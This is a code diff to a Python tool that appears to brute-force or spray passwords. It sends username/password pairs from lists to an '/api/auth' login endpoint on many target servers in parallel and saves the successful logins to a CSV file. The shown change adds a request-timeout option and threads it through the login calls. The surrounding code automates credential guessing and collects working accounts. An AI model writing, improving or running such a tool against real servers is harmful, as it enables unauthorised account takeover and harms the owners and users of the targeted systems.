@@ -28,10 +28,13 @@ lock = Lock()
 thread_count = cpu_count()
 login_api = "/api/auth"
 
-def login(target, username, password):
+def login(target, username, password, timeout=None):
     t1 = time()
     try:
-        response = requests.post(f"http://{target}{login_api}", json={"username": username, "password": password})
+        if timeout:
+            response = requests.post(f"http://{target}{login_api}", json={"username": username, "password": password}, timeout=timeout)
+        else:
+            response = requests.post(f"http://{target}{login_api}", json={"username": username, "password": password})
         t2 = time()
         if response.status_code // 100 == 4:
             return False, t2-t1
@@ -39,11 +42,11 @@ def login(target, username, password):
     except Exception as error:
         t2 = time()
         return error, t2-t1
-def loginHandler(thread_index, targets, credentials):
+def loginHandler(thread_index, targets, credentials, timeout=None):
     successful_logins = {}
     for username, password in credentials:
         for target in targets:
-            status, time_taken = login(target, username, password)
+            status, time_taken = login(target, username, password, timeout)
             if status == True:
                 successful_logins[target] = [username, password]
                 with lock:
@@ -61,6 +64,7 @@ if __name__ == "__main__":
                               ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                               ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
+                              ('-T', "--timeout", "timeout", "Timeout for Request"),
                               ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
     if not arguments.target:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
@@ -111,6 +115,10 @@ if __name__ == "__main__":
         except:
             display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
             exit(0)
+    if not arguments.timeout:
+        arguments.timeout = None
+    else:
+        arguments.timeout = float(arguments.timeout)
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     total_servers = len(arguments.target)
@@ -123,7 +131,7 @@ if __name__ == "__main__":
     threads = []
     display(':', f"Staring {Back.MAGENTA}{thread_count}{Back.RESET} Threads")
     for index, server_division in enumerate(server_divisions):
-        threads.append(pool.apply_async(loginHandler, (index, server_division, arguments.credentials)))
+        threads.append(pool.apply_async(loginHandler, (index, server_division, arguments.credentials, arguments.timeout)))
     for thread in threads:
         successful_logins.update(thread.get())
     pool.close()
